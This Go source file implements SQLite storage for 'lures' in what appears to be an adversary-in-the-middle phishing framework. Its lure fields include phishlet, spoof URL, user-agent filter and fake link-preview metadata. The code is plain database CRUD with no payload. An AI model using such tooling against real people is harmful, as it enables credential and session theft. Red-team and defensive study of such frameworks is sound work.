package sqlite

import (
	"database/sql"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// Compile-time check: Lures satisfies aitm.LureStore.
var _ aitm.LureStore = (*Lures)(nil)

// Lures implements aitm.LureStore backed by SQLite.
type Lures struct{ db *DB }

func NewLureStore(db *DB) *Lures { return &Lures{db: db} }

func (s *Lures) CreateLure(l *aitm.Lure) error {
	_, err := s.db.db.Exec(`
		INSERT INTO lures
			(id, phishlet, base_domain, hostname, path, redirect_url, spoof_url,
			 ua_filter, paused_until, og_title, og_desc, og_image, og_url,
			 redirector, params_key)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		l.ID, l.Phishlet, l.BaseDomain, l.Hostname, l.Path, l.RedirectURL,
		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(),
		l.OGTitle, l.OGDesc, l.OGImage, l.OGURL, l.Redirector, l.ParamsKey,
	)
	if isConflict(err) {
		return aitm.ErrConflict
	}
	return err
}

func (s *Lures) GetLure(id string) (*aitm.Lure, error) {
	row := s.db.db.QueryRow(`SELECT
		id, phishlet, base_domain, hostname, path, redirect_url, spoof_url,
		ua_filter, paused_until, og_title, og_desc, og_image, og_url,
		redirector, params_key FROM lures WHERE id = ?`, id)
	l, err := scanLure(row)
	if err == sql.ErrNoRows {
		return nil, aitm.ErrNotFound
	}
	return l, err
}

func (s *Lures) UpdateLure(l *aitm.Lure) error {
	res, err := s.db.db.Exec(`
		UPDATE lures SET
			phishlet=?, base_domain=?, hostname=?, path=?, redirect_url=?,
			spoof_url=?, ua_filter=?, paused_until=?, og_title=?, og_desc=?,
			og_image=?, og_url=?, redirector=?, params_key=?
		WHERE id=?`,
		l.Phishlet, l.BaseDomain, l.Hostname, l.Path, l.RedirectURL,
		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(),
		l.OGTitle, l.OGDesc, l.OGImage, l.OGURL, l.Redirector, l.ParamsKey,
		l.ID,
	)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Lures) DeleteLure(id string) error {
	res, err := s.db.db.Exec(`DELETE FROM lures WHERE id = ?`, id)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Lures) ListLures() ([]*aitm.Lure, error) {
	rows, err := s.db.db.Query(`SELECT
		id, phishlet, base_domain, hostname, path, redirect_url, spoof_url,
		ua_filter, paused_until, og_title, og_desc, og_image, og_url,
		redirector, params_key FROM lures ORDER BY rowid ASC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.Lure
	for rows.Next() {
		l, err := scanLure(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, l)
	}
	return out, rows.Err()
}

func scanLure(row scanner) (*aitm.Lure, error) {
	var (
		l           aitm.Lure
		pausedUntil int64
	)
	err := row.Scan(
		&l.ID, &l.Phishlet, &l.BaseDomain, &l.Hostname, &l.Path,
		&l.RedirectURL, &l.SpoofURL, &l.UAFilter, &pausedUntil,
		&l.OGTitle, &l.OGDesc, &l.OGImage, &l.OGURL, &l.Redirector, &l.ParamsKey,
	)
	if err != nil {
		return nil, err
	}
	if pausedUntil > 0 {
		l.PausedUntil = time.Unix(pausedUntil, 0)
	}
	_ = l.CompileUA()
	return &l, nil
}
